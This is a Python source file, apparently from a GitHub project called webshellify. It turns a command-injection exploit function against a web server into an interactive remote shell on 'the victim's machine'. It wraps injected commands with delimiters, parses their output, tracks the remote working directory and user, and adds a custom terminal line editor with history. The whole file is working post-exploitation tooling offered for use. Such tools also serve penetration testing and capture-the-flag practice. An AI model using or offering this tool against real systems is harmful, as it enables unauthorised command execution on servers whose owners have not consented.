# created by e-seng on Github
# https://github.com/e-seng/webshellify
from colorama import Back, Fore, Style
import cursor
import getch
import re
import sys
import urllib

class Webshellify:
    """
    Webshellify is a python3 class that attempts to improve the reverse shell
    experience.

    The necessary request information should be specified or any functions that
    fetch necessary values from the server may be passed in as well.

    The location to specify where the command would be is specified by adding the
    string "CMDFUZZ" in either the request body or request query. This fuzzing string
    can be altered if necessary.
    """
    def __init__(self, exploit_fun: str, debug=False, delimiter="output", **args):
        """
        Usage:
        If the vulnerable webpage is at http://localhost/vuln/path, then the correct
        initialization for a Webshellify instance would be:
        `wshell = Webshellify(exploit_function, [options])`

        where `exploit_function` is some function that can pass in a shell
        command that will be run on the victim's device and returns the data
        responded by the webserver

        options then include:
        - debug: (boolean) Enable debugging messages, false by default
        - delimiter: (string) An unused word to delimit the output by
        """
        self.exploit_fun = exploit_fun
        # store necessary information that will improve the webshell
        self.workdir = "/"
        self.parentdir = "/"

        self.host = ""
        self.user = ""

        self.delimiter = delimiter

        self.debug = debug

        self.body = ""
        self.queries = {}
        self.cmd_fuzz = "CMDFUZZ"

    def __gen_command(self, command, chdir=False):
        """
        Generates the given command into a form that can be easily extracted from
        the response.

        This command may contain additional command calls to determine additional
        information of the current user and machine name
        """
        commands = ""
        if(chdir):
            commands += f"cd {self.workdir} && "

        command = re.sub("(\.\.$)|(\.\.\/)", self.parentdir+'/', command)
        command = re.sub("(\.$)|(\.\/)", self.parentdir+'/', command)

        commands += f"echo '`{self.delimiter}`' && {command} && echo '`/{self.delimiter}`' && "
        commands += f"echo '`{self.delimiter}-wd`' && pwd && echo '`/{self.delimiter}-wd`';"

        if(self.debug):
            print(f"cmd is: {commands}")
        return commands

    def __extract_output(self, raw):
        """
        Extracts the output from the command call from the page results

        this will return the current user, working directory and command
        response.

        usage: user, wd, output = self.__extract_output(raw)
        """
        # if(self.debug):
        #     print(f"[debug] in funct `__extract_output`:\nraw: {raw}")

        if(f"`{self.delimiter}`" not in raw):
            raise Exception("[warn] response data not found")

        wd_regex = f"`{self.delimiter}-wd`\n((.*\n)*)`\/{self.delimiter}-wd`"
        output_regex = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
        wd_re = re.compile(wd_regex)
        output_re = re.compile(output_regex)
        if(self.debug):
            print(f"""[debug] in funct `__extract_output`
wd regex: {wd_regex}
match: {wd_re.findall(raw)}
output regex: {output_regex}
match: {output_re.findall(raw)}""")
        workdir = wd_re.findall(raw)[0][0][:-1]
        output = output_re.findall(raw)[0][0][:-1]
        return workdir, output

    def send_command(self, command, chdir=False):
        """
        Sends an individual command in isolation to the host and path initialized.

        This requires a preset location for the command to be inserted into the
        request. This requires the command fuzz keyword to be placed in either a
        query paramter or the request body

        parameters
        ----------
        command: (string) - The command to execute at the victim's machine
        chdir: (boolean, optional) - Indicates whether the directory should be changed.

        This function will also return the name of the host, name of the current
        user and the output of the previous command
        """
        cmd = self.__gen_command(command, chdir=chdir)

        resp = self.exploit_fun(cmd)

        return self.__extract_output(str(resp))

    def __get_parent_dir(self, workdir):
        """
        Reads the current working directory and returns the parent directory
        relative to it

        parameters
        ----------
        workdir: (string) the current working directory

        returns the parent directory
        """
        # currently assuming a Linux machine, so paths are delimited by '/'
        path_parts = workdir.split('/')
        return '/'.join(path_parts[0:-1])

    def __get_init_info(self):
        """
        Fetches information of the user and the initial working directory upon an
        initial load of an interactive shell
        """
        try:
            workdir, whoami = self.send_command("whoami")
            self.workdir = workdir
            self.parentdir = self.__get_parent_dir(workdir)
            self.user = whoami
        except Exception as e:
            print(e)
            print("[info] may be a blind command execution?")
            print("[info] if so, please set optional argument \"blind\" to True")
            exit(1)
            self.workdir = "/?/?"
            self.parentdir = self.__get_parent_dir(self.workdir)
            self.user = "?"

    def create_shell(self, **kwarg):
        """
        Creates an interactive shell that connects to the hostname and path as
        specified during initialization.

        To properly emulate a shell and inject commands, a location to insert
        commands into the request must be specified using the command fuzzing
        keyword, `self.cmd_fuzz`, which is "CMDFUZZ" by default.

        Setters may be used to specify a cookie, request parameter or request
        body that contains this fuzzing keyword. The string must then be in the
        format for the command injection to be successful. Along with this, any
        additional request information to properly perform the remote code
        execution must also be specified.

        parameters
        ----------
        - urlencode (boolean, kwarg) - if True, injected commands will be url-
        encoded before being sent to the victim
        """
        urlencode = False
        if("urlencode" in kwarg.keys()):
            urlencode = kwarg["urlencode"]

        input_handler = _input_str()
        self.__get_init_info()
        # capture KeyboardInterrupts
        exit_confirm = False
        cursor.hide()
        while(True):
            try:
                current_dir = self.workdir
                shell_prompt = f"{self.user}@{self.host}:{current_dir} $ "
                command = input_handler.input(shell_prompt)

                if(" .." in command):
                    command.replace(" ..", f" {self.parentdir}")

                if(" ." in command):
                    command.replace(" .", f" {self.workdir}")

                if(self.debug):
                    print(f"[debug] in funct `create_shell`\nworking directory : {self.workdir}\nparent directory : {self.parentdir}")

                if(urlencode):
                    command = urllib.parse.quote(command)

                workdir, output = self.send_command(command, chdir=True)
                self.workdir = workdir
                self.parentdir = self.__get_parent_dir(workdir)
                print(output)

                exit_confirm = False
            except EOFError:
                if(not exit_confirm):
                    print("\n[note] ^D pressed, this will close the current shell.")
                    print("[note] please press ^D or ^C again to close the program")
                    exit_confirm = True
                    continue
                print("\n[note] exiting...")
                break
            except KeyboardInterrupt:
                if(not exit_confirm):
                    print("\n[note] ^C pressed, not waiting for response anymore")
                    print("[note] the last process may still be running on victim's machine")
                    print("[note] please press ^D or ^C again to close the program")
                    exit_confirm = True
                    continue
                print("\n[note] exiting...")
                break
            except Exception as e:
                print(e)
        cursor.show()

class _input_str:
    """
    Attempts to improve the text input function that can be used in comparison to
    Python's built-in input function
    """
    def __init__(self):
        self.history = []

    def __print_input(self, print_str, input_str, cursor_pos=-1):
        """
        Updates the input prompt with the provided information
        """
        input_length = len(input_str) - 1
        cursor_style = Back.WHITE + Fore.BLACK

        cursor_str = ''.join(input_str[:cursor_pos]) + \
                cursor_style + \
                input_str[cursor_pos] + \
                Style.RESET_ALL + \
                f"{''.join(input_str[cursor_pos+1:])}"

        if(cursor_pos < 0):
            cursor_style = ""
            cursor_str = Style.RESET_ALL + \
                    f"{''.join(input_str)}"

        print_str = f"{print_str}{cursor_str}"
        str_len = len(print_str) - (len(Style.RESET_ALL) + \
                len(cursor_style))
        sys.stdout.write('\r' +
                ' ' * str_len +
                f"\r{print_str}\r"
        )
        sys.stdout.flush()

    def input(self, print_str):
        """
        Attempts to be an improved version of Python's input function

        parameters
        ----------
        print_str: (string) The string to print as a prompt for the input

        this input function currently supports:
        - arrow key cursor movement (left and right)
        - arrow key history traversal (up and down)
        - character deletion (del, backspace)
        - home and end key cursor movement
        - general character input
        """
        input_str = [' ']
        cursor_pos = 0
        input_length = 0
        history_pos = len(self.history)

        self.__print_input(print_str, input_str, cursor_pos)

        last_char = ''
        while(True):
            str_len = len(print_str) + len(input_str) + 1
            try:
                last_char = getch.getch()
            except OverflowError:
                pass
            if(last_char == '\x1b'): # some non-alphanumeric key was pressed
                lc = ''
                input_re = re.compile('[~A-D]')
                while(not input_re.findall(last_char)):
                    last_char += getch.getch()

                if(last_char == '\x1b[A'):
                    # up was pressed
                    if(len(self.history) == 0):
                        # no history available
                        continue
                    if(history_pos > 0): history_pos -= 1
                    last_str_len = input_length
                    input_str = list(self.history[history_pos])
                    input_str.append(' ')
                    cursor_pos = len(input_str) - 1
                    input_length = len(input_str) - 1

                    self.__print_input(print_str, input_str + [' '] * last_str_len, cursor_pos)
                    continue

                if(last_char == '\x1b[B'):
                    # down was pressed
                    if(len(self.history) == 0):
                        # no history available
                        continue
                    if(history_pos < len(self.history)): history_pos += 1
                    last_str_len = input_length
                    input_str = []
                    if(history_pos < len(self.history)):
                        input_str = list(self.history[history_pos])
                    input_str.append(' ')
                    cursor_pos = len(input_str) - 1
                    input_length = len(input_str) - 1

                    self.__print_input(print_str, input_str + [' '] * last_str_len, cursor_pos)
                    continue

                if(last_char == '\x1b[C'):
                    # right was pressed
                    if(cursor_pos < input_length): cursor_pos += 1

                    self.__print_input(print_str, input_str, cursor_pos)
                    continue

                if(last_char == '\x1b[D'):
                    # left was pressed
                    if(cursor_pos > 0): cursor_pos -= 1

                    self.__print_input(print_str, input_str, cursor_pos)
                    continue

                if(last_char == '\x1b[3~'):
                    # delete was pressed
                    if(cursor_pos == input_length): continue
                    if(input_length == 0): continue
                    input_str.pop(cursor_pos)

                    self.__print_input(print_str, input_str + [' '], cursor_pos)
                    input_length -= 1
                    continue

                if(last_char == '\x1b[7~'):
                    # home was pressed
                    cursor_pos = 0

                    self.__print_input(print_str, input_str, cursor_pos)
                    continue

                if(last_char == '\x1b[8~'):
                    # end was pressed
                    cursor_pos = input_length

                    self.__print_input(print_str, input_str, cursor_pos)
                    continue

                continue

            if(last_char == '\x15'): # ^U was entered, clear input
                input_str = [' ']
                cursor_pos = len(input_str) - 1

                self.__print_input(print_str, [' '] * (input_length + 1), cursor_pos)
                input_length = 0
                continue

            if(last_char == '\x04'): # EOF was entered
                self.__print_input(print_str, input_str)
                if(input_length > 0): continue
                raise EOFError("EOF was entered by user")

            if(last_char == '\n'): # enter was pressed
                self.__print_input(print_str, input_str)
                sys.stdout.write('\n')
                sys.stdout.flush()
                break

            if(last_char == '\x7f'): # backspace was pressed
                if(input_length == 0): continue
                if(cursor_pos > 0): cursor_pos -= 1
                input_str.pop(cursor_pos)

                self.__print_input(print_str, input_str + [' '], cursor_pos)
                input_length -= 1
                continue

            input_str.insert(cursor_pos, last_char)
            cursor_pos += 1
            input_length += 1

            self.__print_input(print_str, input_str, cursor_pos)
        command = ''.join(input_str[:-1])
        self.history.append(command)
        return command
